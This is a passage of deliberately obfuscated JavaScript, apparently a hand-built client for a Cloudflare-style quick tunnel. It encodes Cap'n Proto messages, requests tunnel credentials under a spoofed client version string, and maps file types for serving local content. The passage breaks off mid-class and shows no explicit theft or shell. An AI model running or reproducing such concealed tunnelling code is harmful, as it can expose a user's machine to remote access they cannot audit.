        'ChjVy2vZC0HHBMrZAgfRzq',
        'z2v0qwn0AxzLrwnKC2fwAW',
        'z2LK',
        'wvPWv2S',
        'B3jPz2LUignVBM5Ly3rPB24GDgLTzw91Da',
        'C2vUzenPCgHLCG',
        'BvPItuW',
        'Dg90ywXozxr3B3jRrg93BG',
        'vwPNrxK',
        '6k6/6zEUia',
        'CgvT',
        'tNv0uMS',
        'C2vUzeHHBMrZAgfRzq',
        'y3jLyxrLv3jPDgvtDhjLyw0',
        'BwvTx3rVDgfS',
        't2jVAMW',
        'rM9hBgO',
        'vvPJuhy',
        'CMvHBhbHDgHtEw5J',
        'zg9ABgy',
        'EYjZCMmIoIjVCMLNAw4IlcjMBg93x3jHDgvFBgLTAxrLzci6zMfSC2v9',
        'zwnPzxnFChjPDMf0zv9RzxK',
        'y3vcr2W',
        'rwvlrNm',
        'runjrvnFufvcteLdx0Tfwv9qru0',
        'rMLSzsb1CgXVywrLzcbZDwnJzxnZzNvSBhKU',
        'zMfPBgvKihrVignYzwf0zsb0Dw5UzwW6ia',
        'z2jQyKq',
        'uuXHAgK',
        'zgvJCNLWDerHDge',
        'se9tva',
        'x3j1BKXVB3a',
        'vLfcyxe',
        'yxbWBgLJyxrPB24VB2n0zxqTC3rYzwfT',
        'Axnoyu4',
        'C2vHCMnO',
        'z2v0tg9JywXjuhy2',
        'EejrAu0',
        'x2zVCM1HDeXVz0vUDhj5',
        'DhvUBMvSrg9TywLU',
        'DhvUBMvSx2rVBwfPBG',
        'zwnKC2fqDwjRzxK',
        'AxnZDwvYie8GBwLZBwf0y2G6ia',
        'Aer0B04',
        'rw5JCNLWDfDPDgHbza',
        'B3zLCMXHEq',
        'Ahr0Chm6lY9Py2fUAgf6AxaUy29T',
        'vuvivLy',
        'twLZC2LUzYbYzxf1zxn0x2LK',
        'CKDyuwi',
        'ywn0AxzHDgu',
        'z2LmDw4',
        'BgLTAxq',
        'AezMthK',
        'yxbWBgLJyxrPB24VANnVBG',
        'z2v0ugvLCKnLCNrPzMLJyxrL',
        'vhLKD2C',
        'z2v0uMvHBhrPBwvjBMzV',
        'y2XVC2u',
        'CMvWB3j0u2H6ywXezwj1zW',
        'DxbNCMfKzq',
        'qKPsvhe',
        'tufyx1rbu0TFte9hx1njwKu',
        'y2H1BMTFAwqGyw5KihrVDgfSx2nODw5RCYbTDxn0igjLig51BwvYAwm',
        'zgLZDhjV',
        'l2fWAs9MAwXLl2nHDa',
        'x3n0yxr1C19JywnOzv90Aw1L',
        'yw56sNm',
        'runjrvnFufvcs0vzoIdMNkRORR7NVA7NJQ/LOOpLJ5JPH4/KUjtMLOFKU7yGA2v5CY9Hz2vUDf9Ly2LLC19WDwiUyJy0ios4JEwTMowCQa',
        'Eufcz2S',
        'x2DLBMvYyxrLuMf3s2v5CgfPCG',
        'qKXmrM4',
        'l2fWAs9HCMDV',
        'ChjPBNrLza',
        'wgvcwfm',
        'DLDtsLa',
        'zLDIu3u',
        'zwXxqwO',
        'AwyTBM9Uzs1TyxrJAa',
        'DhvUBMvSswq',
        'CxHhq0y',
        'tu5OANi',
        'C3rYzwfTswq',
        'C29JA2v0',
        'CMzTCvC',
        'C29QCLO',
        '4P2mioE7IoERR+s8MUIVNEw8GUw4UdOG',
        'EhHIyKK',
        'ywnJB3vUDf90ywC',
        'vgD3rxa',
        'CMvWzwf0',
        'y29UBMvJDgLVBLDPBMrVDW',
        'sNPUu1q',
        'yxbWBgLJyxrPB24VEg1S',
        'C2vUzezYyw1L',
        'Bwf4',
        'Dgv4Da',
        'B25eyxrH',
        'rujtt0O',
        'Dg9cExrLCW',
        'x1niwKfmx0Tfwv9isu5ux1nit1Do',
        'rK9mte9xx1nztuXjtKTt',
        'uxDuBfC',
        'y2zyvK0',
        'y29UBMvJDgLVBIb0Aw1LB3v0',
        'vxfuyLa',
        'ls0Tls1cruDjtG',
        'zxHPDa',
        'CMvQzwn0',
        'uhz0sgG',
        'oM1LDgHVza',
        'tK9ju0vFs0vzu19jtLrfuK5bta',
        'Dgv4Dc9JC3m7ignOyxjZzxq9DxrMltG',
        'CMvNAxn0zxjLza',
        'BKDbqwu',
        'icHRzxKG5BEY6k6+572UoIa',
        'C3bHD24'
    ];
    a0a = function () {
        return fL;
    };
    return a0a();
}
function a0ae(a) {
    const cy = a0aQ, b = {
            'qlQuV': cy(0x592),
            'lIMLx': function (d, f, g, h) {
                return d(f, g, h);
            }
        }, c = Buffer[cy(0x45b)](a, b['qlQuV']);
    return Buffer[cy(0x327)]([
        b[cy(0x3c5)](a0ad, c[cy(0x32c)], 0x7, 0x0),
        c
    ]);
}
function a0af(a) {
    const cz = a0aQ, b = {
            'AbOJF': ':status',
            'XuRKC': function (d, f) {
                return d === f;
            },
            'GHpZh': '200',
            'fCqiO': function (d, f) {
                return d === f;
            },
            'xBQiM': function (d, f) {
                return d === f;
            },
            'QxdUq': cz(0x5d0),
            'yyRaH': cz(0x271),
            'oUrxE': cz(0x5c2),
            'vqIPA': function (d, f) {
                return d === f;
            },
            'TjGWU': cz(0x385),
            'jvNre': function (d, f) {
                return d === f;
            },
            'cvdVj': cz(0x61b),
            'PvTxB': function (d, f, g, h) {
                return d(f, g, h);
            },
            'MUGEE': function (d, f) {
                return d(f);
            }
        }, c = [];
    for (const [d, f] of a) {
        if (d === b[cz(0x32f)] && b[cz(0x71b)](f, b[cz(0x5eb)]))
            c[cz(0x381)](0x88);
        else {
            if (d === b[cz(0x32f)] && b[cz(0x5c7)](f, cz(0x2c8)))
                c['push'](0x89);
            else {
                if (b['fCqiO'](d, b[cz(0x32f)]) && b['xBQiM'](f, b[cz(0x851)]))
                    c[cz(0x381)](0x8a);
                else {
                    if (d === b[cz(0x32f)] && f === b[cz(0x5ed)])
                        c['push'](0x8b);
                    else {
                        if (d === b['AbOJF'] && b[cz(0x69a)](f, b[cz(0x3c8)]))
                            c[cz(0x381)](0x8c);
                        else {
                            if (b[cz(0x69a)](d, b[cz(0x32f)]) && b['vqIPA'](f, b[cz(0x413)]))
                                c['push'](0x8d);
                            else
                                b[cz(0x69a)](d, ':status') && b[cz(0x665)](f, b[cz(0x809)]) ? c[cz(0x381)](0x8e) : (c[cz(0x381)](...b['PvTxB'](a0ad, 0x0, 0x4, 0x0)), c[cz(0x381)](...b[cz(0x812)](a0ae, d)), c[cz(0x381)](...a0ae(f)));
                        }
                    }
                }
            }
        }
    }
    return Buffer[cz(0x45b)](c);
}
class a0ag {
    constructor() {
        const cA = a0aQ;
        this[cA(0x5cb)] = [];
    }
    [a0aQ(0x43b)](a) {
        const cB = a0aQ, b = {
                'jhsBf': function (d, f) {
                    return d < f;
                }
            }, c = this[cB(0x5cb)][cB(0x32c)];
        for (let d = 0x0; b[cB(0x559)](d, a); d++) {
            this[cB(0x5cb)][cB(0x381)](0x0n);
        }
        return c;
    }
    ['structPtr'](a, b, c, d) {
        const cC = a0aQ, f = {
                'dukJh': function (j, k) {
                    return j - k;
                },
                'axlvi': function (j, k) {
                    return j & k;
                },
                'oHKOY': function (j, k) {
                    return j | k;
                },
                'lhXZj': function (j, k) {
                    return j << k;
                },
                'bslyT': function (j, k) {
                    return j(k);
                },
                'UAZzU': function (j, k) {
                    return j | k;
                }
            }, g = f[cC(0x444)](f[cC(0x444)](b, a), 0x1), h = f[cC(0x481)](BigInt(g) << 0x2n, 0xfffffffcn), i = f[cC(0x7ba)](BigInt(f[cC(0x481)](c, 0xffff)), f[cC(0x5c0)](f[cC(0x7c7)](BigInt, f['axlvi'](d, 0xffff)), 0x10n));
        this[cC(0x5cb)][a] = f['UAZzU'](h, f[cC(0x5c0)](i, 0x20n));
    }
    [a0aQ(0x845)](a, b, c) {
        const cD = a0aQ, d = {
                'gvEbM': function (g, h) {
                    return g << h;
                },
                'IXiTc': function (g, h) {
                    return g(h);
                },
                'Wptkt': function (g, h) {
                    return g * h;
                },
                'CEcKs': function (g, h) {
                    return g | h;
                },
                'LBvly': function (g, h) {
                    return g & h;
                },
                'uVjrU': function (g, h) {
                    return g(h);
                }
            }, f = d['gvEbM'](0xffn, d['IXiTc'](BigInt, d[cD(0x648)](b, 0x8)));
        this[cD(0x5cb)][a] = d[cD(0x2a8)](d[cD(0x53c)](this['words'][a], ~f), d[cD(0x311)](BigInt(d['LBvly'](c, 0xff)), d['uVjrU'](BigInt, d[cD(0x648)](b, 0x8))));
    }
    [a0aQ(0x221)](a, b, c) {
        const cE = a0aQ, d = {
                'jfSDe': function (g, h) {
                    return g << h;
                },
                'lgeGx': function (g, h) {
                    return g | h;
                },
                'MlRCs': function (g, h) {
                    return g & h;
                },
                'qKoeO': function (g, h) {
                    return g(h);
                },
                'ojjAd': function (g, h) {
                    return g * h;
                }
            }, f = d['jfSDe'](0xffffn, BigInt(b * 0x8));
        this[cE(0x5cb)][a] = d[cE(0x652)](d[cE(0x642)](this[cE(0x5cb)][a], ~f), d[cE(0x304)](d['qKoeO'](BigInt, c & 0xffff), BigInt(d[cE(0x746)](b, 0x8))));
    }
    ['setU32'](a, b, c) {
        const cF = a0aQ, d = {
                'GHSGg': function (g, h) {
                    return g << h;
                },
                'QmUgx': function (g, h) {
                    return g(h);
                },
                'ohjJY': function (g, h) {
                    return g * h;
                },
                'qoAUz': function (g, h) {
                    return g | h;
                },
                'aoMMZ': function (g, h) {
                    return g & h;
                },
                'YaEfM': function (g, h) {
                    return g & h;
                }
            }, f = d[cF(0x497)](0xffffffffn, d[cF(0x425)](BigInt, d['ohjJY'](b, 0x8)));
        this['words'][a] = d[cF(0x5aa)](d['aoMMZ'](this['words'][a], ~f), d[cF(0x497)](BigInt(d['YaEfM'](c, 0xffffffff)), d[cF(0x425)](BigInt, d[cF(0x483)](b, 0x8))));
    }
    [a0aQ(0x631)](a, b) {
        const cG = a0aQ, c = {
                'PDxbO': function (d, f) {
                    return d & f;
                },
                'UDdZL': function (d, f) {
                    return d(f);
                }
            };
        this[cG(0x5cb)][a] = c[cG(0x854)](c[cG(0x39a)](BigInt, b), 0xffffffffffffffffn);
    }
    [a0aQ(0x280)](a, b, c = ![]) {
        const cH = a0aQ, d = {
                'TRryP': cH(0x63e),
                'AcnWw': function (m, n) {
                    return m / n;
                },
                'YDBtE': function (m, n) {
                    return m + n;
                },
                'ABwiw': function (m, n) {
                    return m % n;
                },
                'khgBv': function (m, n) {
                    return m - n;
                },
                'pQiOY': function (m, n) {
                    return m - n;
                },
                'bFvoH': function (m, n) {
                    return m | n;
                },
                'IqOgl': function (m, n) {
                    return m << n;
                },
                'oyzUw': function (m, n) {
                    return m(n);
                },
                'fMuFY': function (m, n) {
                    return m | n;
                }
            }, f = typeof b === d['TRryP'] ? Buffer[cH(0x45b)](b, cH(0x592)) : b, g = f['length'] + (c ? 0x1 : 0x0), h = this[cH(0x43b)](Math[cH(0x3d2)](d[cH(0x503)](g, 0x8)));
        for (let m = 0x0; m < f['length']; m++) {
            this[cH(0x845)](d[cH(0x874)](h, Math[cH(0x479)](m / 0x8)), d[cH(0x75d)](m, 0x8), f[m]);
        }
        const j = d['khgBv'](d[cH(0x393)](h, a), 0x1), k = d[cH(0x436)](d[cH(0x37a)](d[cH(0x77a)](BigInt, j), 0x2n), 0x1n) & 0xffffffffn, l = d[cH(0x436)](0x2n, d[cH(0x77a)](BigInt, g & 0x1fffffff) << 0x3n);
        this[cH(0x5cb)][a] = d[cH(0x88c)](k, l << 0x20n);
    }
    ['writeTextList'](a, b) {
        const cI = a0aQ, c = {
                'uabBX': function (g, h) {
                    return g - h;
                },
                'FSebI': function (g, h) {
                    return g & h;
                },
                'EYwXm': function (g, h) {
                    return g | h;
                },
                'wCkgU': function (g, h) {
                    return g << h;
                },
                'TEbgQ': function (g, h) {
                    return g(h);
                },
                'PGdKI': function (g, h) {
                    return g < h;
                },
                'ePmTh': function (g, h) {
                    return g + h;
                }
            };
        if (!b[cI(0x32c)]) {
            this['words'][a] = 0x0n;
            return;
        }
        const d = this[cI(0x43b)](b[cI(0x32c)]), f = c['uabBX'](d - a, 0x1);
        this['words'][a] = c[cI(0x1c5)](c[cI(0x794)](c['wCkgU'](c['TEbgQ'](BigInt, f), 0x2n), 0x1n), 0xffffffffn) | c['wCkgU'](0x6n | c['wCkgU'](BigInt(b[cI(0x32c)]), 0x3n), 0x20n);
        for (let g = 0x0; c[cI(0x428)](g, b['length']); g++) {
            this['writeBytes'](c[cI(0x536)](d, g), b[g], !![]);
        }
    }
    ['finish']() {
        const cJ = a0aQ, a = {
                'jZRhB': function (d, f) {
                    return d * f;
                },
                'zZLtn': function (d, f) {
                    return d < f;
                },
                'ITXIo': function (d, f) {
                    return d & f;
                }
            }, b = Buffer[cJ(0x43b)](0x8);
        b[cJ(0x37d)](0x0, 0x0), b[cJ(0x37d)](this[cJ(0x5cb)][cJ(0x32c)], 0x4);
        const c = Buffer[cJ(0x43b)](a['jZRhB'](this[cJ(0x5cb)][cJ(0x32c)], 0x8));
        for (let d = 0x0; a[cJ(0x435)](d, this[cJ(0x5cb)][cJ(0x32c)]); d++) {
            c[cJ(0x341)](a[cJ(0x1cf)](this['words'][d], 0xffffffffffffffffn), a[cJ(0x5b8)](d, 0x8));
        }
        return Buffer[cJ(0x327)]([
            b,
            c
        ]);
    }
}
function a0ah(a) {
    const cK = a0aQ, b = new a0ag(), c = b[cK(0x43b)](0x1), d = b['alloc'](0x1), f = b[cK(0x43b)](0x1);
    b['structPtr'](c, d, 0x1, 0x1), b[cK(0x221)](d, 0x0, 0x8);
    const g = b['alloc'](0x1);
    return b[cK(0x43b)](0x1), b[cK(0x56c)](f, g, 0x1, 0x1), b[cK(0x3e5)](g, 0x0, a), b[cK(0x3a6)]();
}
function a0ai(a, b, c, d, f, g) {
    const cL = a0aQ, h = {
            'CcBDX': function (H, I) {
                return H & I;
            },
            'GtjeU': function (H, I) {
                return H | I;
            },
            'LWIpj': '2024.10.0-Nexus',
            'AmFMq': cL(0x783)
        }, i = new a0ag(), j = i[cL(0x43b)](0x1), k = i[cL(0x43b)](0x1), l = i[cL(0x43b)](0x1);
    i[cL(0x56c)](j, k, 0x1, 0x1), i[cL(0x221)](k, 0x0, 0x2);
    const m = i['alloc'](0x1), n = i['alloc'](0x1);
    i[cL(0x43b)](0x1);
    const o = i[cL(0x43b)](0x1), p = i[cL(0x43b)](0x1);
    i[cL(0x43b)](0x1), i[cL(0x56c)](l, m, 0x3, 0x3), i[cL(0x3e5)](m, 0x0, a), i['setU64'](n, 0xf71695ec7fe85497n);
    const q = i[cL(0x43b)](0x1), r = i['alloc'](0x1);
    i[cL(0x56c)](o, q, 0x1, 0x1), i[cL(0x221)](q, 0x4, 0x1);
    const s = i[cL(0x43b)](0x1);
    i[cL(0x43b)](0x1), i[cL(0x56c)](r, s, 0x1, 0x1), i[cL(0x3e5)](s, 0x0, b);
    const t = i[cL(0x43b)](0x1);
    i['alloc'](0x1), i[cL(0x56c)](p, t, 0x0, 0x2);
    const u = i['alloc'](0x1), v = i[cL(0x43b)](0x1), w = i[cL(0x43b)](0x1), x = i[cL(0x43b)](0x1);
    i[cL(0x56c)](t, u, 0x1, 0x3), i['setU8'](u, 0x0, g);
    const y = i[cL(0x43b)](0x1), z = i[cL(0x43b)](0x1);
    i[cL(0x56c)](v, y, 0x0, 0x2), i[cL(0x280)](y, c, !![]), i[cL(0x280)](z, d), i[cL(0x280)](w, f);
    const A = i['alloc'](0x1), B = i[cL(0x43b)](0x1);
    i[cL(0x43b)](0x1), i['structPtr'](x, A, 0x1, 0x2);
    const C = i['alloc'](0x1), D = i[cL(0x43b)](0x1), E = i[cL(0x43b)](0x1), F = i[cL(0x43b)](0x1);
    i[cL(0x56c)](B, C, 0x0, 0x4);
    const G = a0k['randomBytes'](0x10);
    return G[0x6] = h['CcBDX'](G[0x6], 0xf) | 0x40, G[0x8] = h[cL(0x362)](G[0x8] & 0x3f, 0x80), i[cL(0x280)](C, G), i[cL(0x30c)](D, [
        cL(0x4b6),
        cL(0x498)
    ]), i[cL(0x280)](E, h[cL(0x477)], !![]), i[cL(0x280)](F, h[cL(0x291)], !![]), i[cL(0x3a6)]();
}
function a0aj(a) {
    const cM = a0aQ, b = {
            'ePNpv': function (f, g) {
                return f - g;
            },
            'TPPhW': function (f, g) {
                return f + g;
            },
            'RUuOu': function (f, g) {
                return f + g;
            },
            'fgQgs': function (f, g) {
                return f * g;
            },
            'nppWa': function (f, g) {
                return f % g;
            },
            'OJxEq': function (f, g) {
                return f < g;
            },
            'LmHrv': function (f, g) {
                return f + g;
            },
            'JhOig': function (f, g) {
                return f - g;
            },
            'cCEci': cM(0x6ef)
        }, c = [];
    let d = 0x0;
    while (b[cM(0x47b)](a[cM(0x32c)], d) >= 0x8) {
        const f = a[cM(0x647)](d), g = a[cM(0x647)](b[cM(0x664)](d, 0x4)), h = b['RUuOu'](f, 0x1);
        let j = 0x2 + h, k = b['fgQgs'](j, 0x4);
        b[cM(0x5fb)](k, 0x8) && (k += 0x4);
        if (b[cM(0x7e8)](b[cM(0x47b)](a['length'], d), k))
            break;
        const l = [g];
        for (let n = 0x1; n < h; n++) {
            l[cM(0x381)](a[cM(0x647)](b[cM(0x243)](d, 0x4) + b[cM(0x499)](n, 0x4)));
        }
        const m = k + l[cM(0x61f)]((o, p) => o + p, 0x0) * 0x8;
        if (b[cM(0x302)](a[cM(0x32c)], d) < m)
            break;
        if (h !== 0x1)
            throw new Error(b[cM(0x894)]);
        c[cM(0x381)](a['subarray'](b['RUuOu'](d, k), b[cM(0x243)](d, m))), d += m;
    }
    return [
        c,
        a[cM(0x88a)](d)
    ];
}
function a0ak(a, b) {
    const cN = a0aQ, c = {
            'vDklG': function (j, k) {
                return j >= k;
            },
            'ohTKh': 'Cap\x27n\x20Proto\x20pointer\x20out\x20of\x20bounds',
            'KXAoo': cN(0x3a0),
            'hXnxk': function (j, k) {
                return j >> k;
            },
            'lKqqg': function (j, k) {
                return j & k;
            },
            'JJjPi': function (j, k) {
                return j + k;
            },
            'WAClp': function (j, k) {
                return j(k);
            },
            'DYsSm': function (j, k) {
                return j(k);
            },
            'KBiIi': function (j, k) {
                return j >> k;
            },
            'hXRCp': function (j, k) {
                return j > k;
            },
            'yWTkR': function (j, k) {
                return j + k;
            }
        };
    if (c['vDklG'](b, a[cN(0x32c)]))
        throw new Error(c['ohTKh']);
    const d = a[b];
    if ((d & 0x3n) !== 0x0n)
        throw new Error(c[cN(0x210)]);
    let f = c[cN(0x2e4)](d, 0x2n) & 0x3fffffffn;
    c['lKqqg'](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c[cN(0x21b)](b, 0x1) + Number(f), h = c[cN(0x323)](Number, c[cN(0x813)](d >> 0x20n, 0xffffn)), i = c[cN(0x795)](Number, c[cN(0x813)](c[cN(0x3e3)](d, 0x30n), 0xffffn));
    if (g < 0x0 || c[cN(0x77b)](c[cN(0x21b)](c[cN(0x4a2)](g, h), i), a[cN(0x32c)]))
        throw new Error(cN(0x7ff));
    return [
        g,
        h,
        i
    ];
}
function a0al(a, b) {
    const cO = a0aQ, c = {
            'gApXc': function (m, n) {
                return m !== n;
            },
            'mQfqo': function (m, n) {
                return m & n;
            },
            'ZPvqV': function (m, n) {
                return m >> n;
            },
            'ygdhN': function (m, n) {
                return m & n;
            },
            'NRXUJ': function (m, n) {
                return m + n;
            },
            'VcnaZ': function (m, n) {
                return m + n;
            },
            'VCggw': function (m, n) {
                return m(n);
            },
            'HYaVy': function (m, n) {
                return m >> n;
            },
            'fJLUv': function (m, n) {
                return m / n;
            },
            'goyDr': function (m, n) {
                return m < n;
            },
            'LLimY': function (m, n) {
                return m > n;
            },
            'ijOzL': function (m, n) {
                return m * n;
            },
            'etGEx': function (m, n) {
                return m & n;
            },
            'yUMMQ': function (m, n) {
                return m + n;
            },
            'gIZfT': function (m, n) {
                return m * n;
            },
            'MnMkY': cO(0x592)
        };
    if (b >= a[cO(0x32c)])
        return '';
    const d = a[b];
    if (c[cO(0x42b)](d & 0x3n, 0x1n))
        return '';
    let f = c['mQfqo'](c[cO(0x4e9)](d, 0x2n), 0x3fffffffn);
    c[cO(0x287)](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c['NRXUJ'](c[cO(0x448)](b, 0x1), Number(f)), h = Number(c[cO(0x287)](c[cO(0x4e9)](d, 0x20n), 0x7n)), j = c['VCggw'](Number, c['HYaVy'](d, 0x23n)), k = Math[cO(0x3d2)](c[cO(0x520)](j, 0x8));
    if (c['gApXc'](h, 0x2) || c[cO(0x250)](g, 0x0) || c['LLimY'](c['NRXUJ'](g, k), a[cO(0x32c)]))
        return '';
    const l = Buffer['alloc'](c[cO(0x2a7)](k, 0x8));
    for (let m = 0x0; m < k; m++) {
        l[cO(0x341)](c[cO(0x3e2)](a[c['yUMMQ'](g, m)], 0xffffffffffffffffn), c[cO(0x823)](m, 0x8));
    }
    return l[cO(0x88a)](0x0, j)[cO(0x3e8)](c[cO(0x84f)])['replace'](/\0+$/, '');
}
function a0am(a) {
    const cP = a0aQ, b = {
            'EBrmP': function (z, A) {
                return z < A;
            },
            'bDhmg': function (z, A) {
                return z < A;
            },
            'yMKsz': function (z, A) {
                return z / A;
            },
            'CHytD': function (z, A) {
                return z * A;
            },
            'sSvmm': function (z, A) {
                return z & A;
            },
            'BJhOL': function (y, z, A) {
                return y(z, A);
            },
            'vpjbm': function (z, A) {
                return z + A;
            },
            'ubRGK': function (y, z) {
                return y(z);
            },
            'BwKzI': function (z, A) {
                return z >> A;
            },
            'jYPHK': function (z, A) {
                return z === A;
            },
            'EVUZa': function (y, z, A) {
                return y(z, A);
            },
            'tCBLj': function (z, A) {
                return z + A;
            },
            'GfYRa': function (z, A) {
                return z !== A;
            },
            'NVPFH': cP(0x7dd),
            'mZbML': function (z, A) {
                return z + A;
            },
            'mUtff': function (z, A) {
                return z & A;
            },
            'eSdOY': function (z, A) {
                return z === A;
            },
            'inAXE': function (y, z, A) {
                return y(z, A);
            },
            'obcvb': function (y, z, A) {
                return y(z, A);
            },
            'XFmRs': function (z, A) {
                return z + A;
            },
            'EpByW': function (y, z) {
                return y(z);
            },
            'OlgPk': function (z, A) {
                return z & A;
            }
        };
    if (a[cP(0x32c)] % 0x8 || b['EBrmP'](a[cP(0x32c)], 0x18))
        throw new Error('short\x20Cap\x27n\x20Proto\x20return');
    const c = [];
    for (let y = 0x0; b[cP(0x7d7)](y, b[cP(0x2a0)](a[cP(0x32c)], 0x8)); y++) {
        c['push'](a[cP(0x338)](b[cP(0x74d)](y, 0x8)));
    }
    let d, f, g;
    [d, f, g] = a0ak(c, 0x0);
    if (b[cP(0x2ea)](f, 0x1) || b['sSvmm'](c[d], 0xffffn) !== 0x3n)
        throw new Error(cP(0x733));
    let h, j, k;
    [h, j, k] = b['BJhOL'](a0ak, c, b[cP(0x44f)](d, f));
    const l = b[cP(0x707)](Number, b[cP(0x581)](b[cP(0x86f)](c[h], 0x30n), 0xffffn));
    if (b[cP(0x76e)](l, 0x1))
        return {
            'ok': ![],
            'error': b[cP(0x633)](a0al, c, b[cP(0x3b5)](h, j))
        };
    if (b['GfYRa'](l, 0x0))
        return {
            'ok': ![],
            'error': b[cP(0x5cd)] + l
        };
    let m, n, o;
    [m, n, o] = b[cP(0x278)](a0ak, c, b[cP(0x67b)](h, j));
    let p, q, r;
    [p, q, r] = b[cP(0x633)](a0ak, c, b[cP(0x44f)](m, n));
    const s = c[p], t = b[cP(0x707)](Number, b[cP(0x565)](s, 0xffffn));
    if (b[cP(0x539)](t, 0x0))
        return {
            'ok': ![],
            'error': a0al(c, b[cP(0x67b)](p, q))
        };
    if (b[cP(0x4bb)](t, 0x1))
        return {
            'ok': ![],
            'error': b['mZbML'](cP(0x412), t)
        };
    let u, v, w;
    [u, v, w] = b['inAXE'](a0ak, c, b[cP(0x67b)](p, q));
    const x = b['obcvb'](a0al, c, b[cP(0x533)](u + v, 0x1));
    return {
        'ok': !![],
        'location': x,
        'remoteManaged': b['EpByW'](Boolean, b[cP(0x1f9)](c[u], 0x1n))
    };
}
const a0an = {
    '.js': a0aQ(0x770),
    '.mjs': a0aQ(0x770),
    '.css': a0aQ(0x6e5),
    '.json': a0aQ(0x400),
    '.map': a0aQ(0x400),
    '.wasm': a0aQ(0x2b4),
    '.html': a0aQ(0x7b2),
    '.htm': a0aQ(0x7b2),
    '.svg': a0aQ(0x3ce),
    '.xml': a0aQ(0x6d2),
    '.woff': 'font/woff2',
    '.woff2': a0aQ(0x879),
    '.png': a0aQ(0x2ad),
    '.jpg': a0aQ(0x7b5),
    '.jpeg': a0aQ(0x7b5),
    '.gif': a0aQ(0x73c),
    '.ico': a0aQ(0x819)
};
function a0ao(a) {
    const cQ = a0aQ, b = a['endsWith']('/') ? a[cQ(0x4a4)](0x0, -0x1) : a, c = b[cQ(0x4b5)]('.');
    if (c < 0x0)
        return '';
    return a0an[b[cQ(0x4a4)](c)[cQ(0x207)]()] || '';
}
function a0ap(a) {
    const cR = a0aQ, b = {
            'CEHiD': function (c, d) {
                return c !== d;
            },
            'hIDkK': cR(0x63e),
            'TbDOv': function (c, d) {
                return c + d;
            },
            'enNNz': function (c, d) {
                return c % d;
            }
        };
    if (Array[cR(0x73e)](a))
        return Buffer[cR(0x45b)](a);
    if (b[cR(0x578)](typeof a, b[cR(0x59f)]))
        throw new Error(cR(0x5e0));
    return Buffer[cR(0x45b)](b[cR(0x7d0)](a, '='[cR(0x6cf)](b[cR(0x5dd)](-a[cR(0x32c)], 0x4))), cR(0x63a));
}
const a0aq = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
function a0ar(a) {
    const cS = a0aQ, b = {
            'elWAj': cS(0x592),
            'tZrDt': function (c, d) {
                return c + d;
            },
            'tsjRm': '):\x20',
            'XuukC': function (c, d) {
                return c(d);
            },
            'BSoKd': cS(0x63e),
            'iyngX': function (c, d) {
                return c !== d;
            },
            'UWigV': cS(0x238),
            'AwdZj': cS(0x347),
            'JMNOE': cS(0x545),
            'anzJs': cS(0x484),
            'mCQxU': cS(0x4ef),
            'JKGvR': function (c, d) {
                return c === d;
            },
            'doZlf': cS(0x404),
            'yzdZo': cS(0x40d)
        };
    return new Promise((c, d) => {
        const cT = cS;
        let f;
        try {
            f = new URL(a[cT(0x538)](/\/+$/, '') + cT(0x515));
        } catch (i) {
            d(new Error(b['tZrDt'](cT(0x636), i['message'])));
            return;
        }
        const g = b[cT(0x611)](f['protocol'], b[cT(0x688)]) ? a0h : a0g, h = g[cT(0x719)](f, {
                'method': cT(0x208),
                'headers': {
                    'Content-Type': 'application/json',
                    'User-Agent': b[cT(0x7eb)]
                },
                'timeout': 0x3a98
            }, j => {
                const cU = cT, k = {
                        'AKhsn': b[cU(0x6c2)],
                        'jDvrc': function (m, n) {
                            const cV = cU;
                            return b[cV(0x31b)](m, n);
                        },
                        'eDgAU': cU(0x629),
                        'ZjsWi': b[cU(0x3eb)],
                        'pvjpf': function (m, n) {
                            const cW = cU;
                            return b[cW(0x74f)](m, n);
                        },
                        'ZVSLp': b[cU(0x20e)],
                        'uCdiK': function (m, n) {
                            return b['iyngX'](m, n);
                        },
                        'wGeRL': b[cU(0x26c)],
                        'rZliY': b[cU(0x729)],
                        'Ogqvn': b[cU(0x348)]
                    }, l = [];
                j['on'](cU(0x2b6), m => l[cU(0x381)](m)), j['on'](b[cU(0x6b8)], d), j['on'](b[cU(0x42c)], () => {
                    const cX = cU, m = Buffer[cX(0x327)](l), n = j[cX(0x329)];
                    let o;
                    try {
                        o = JSON['parse'](m[cX(0x3e8)](k[cX(0x4a1)]));
                    } catch (q) {
                        d(new Error(k[cX(0x407)](k['eDgAU'], n) + k[cX(0x475)] + m[cX(0x88a)](0x0, 0x12c)[cX(0x3e8)](k[cX(0x4a1)])));
                        return;
                    }
                    const p = o[cX(0x219)] || {};
                    if (!(o[cX(0x75f)] ?? !![]) || !p) {
                        d(new Error('quick\x20tunnel\x20request\x20was\x20rejected:\x20' + JSON['stringify'](o[cX(0x618)])));
                        return;
                    }
                    try {
                        const r = k[cX(0x5d6)](String, p['id']);
                        if (!a0aq[cX(0x5b3)](r))
                            throw new Error(cX(0x3df));
                        if (typeof p[cX(0x6cd)] !== k[cX(0x4f2)] || k[cX(0x80a)](typeof p[cX(0x5b1)], k[cX(0x4f2)]))
                            throw new Error(k['wGeRL']);
                        const s = a0ap(p['secret']), t = Buffer[cX(0x45b)](r['replace'](/-/g, ''), k[cX(0x7de)]);
                        c([
                            p['hostname'],
                            p[cX(0x6cd)],
                            s,
                            t
                        ]);
                    } catch (u) {
                        k['pvjpf'](d, new Error(k[cX(0x4a5)] + u['message']));
                    }
                });
            });
        h['on'](b['anzJs'], j => d(new Error(cT(0x636) + j[cT(0x346)]))), h[cT(0x4ef)]();
    });
}
function a0as(a) {
    const cY = a0aQ;
    return a[cY(0x3dc)](([b, c]) => Buffer[cY(0x45b)](b, cY(0x592))[cY(0x3e8)](cY(0x63a))[cY(0x538)](/=+$/, '') + ':' + Buffer[cY(0x45b)](c, 'utf8')[cY(0x3e8)]('base64')[cY(0x538)](/=+$/, ''))[cY(0x48d)](';');
}
class a0at {
    constructor(a) {
        const cZ = a0aQ, b = {
                'dWKJP': cZ(0x257),
                'kcTJC': cZ(0x484),
                'fHGbz': cZ(0x2b6),
                'qSwDl': 'end'
            }, c = b[cZ(0x201)]['split']('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                a['on'](b[cZ(0x511)], f => {
                    const d0 = cZ;
                    this['errored'] = f, this[d0(0x825)]();
                });
                continue;
            case '1':
                this['closed'] = ![];
                continue;
            case '2':
                this[cZ(0x6c8)] = a;
                continue;
            case '3':
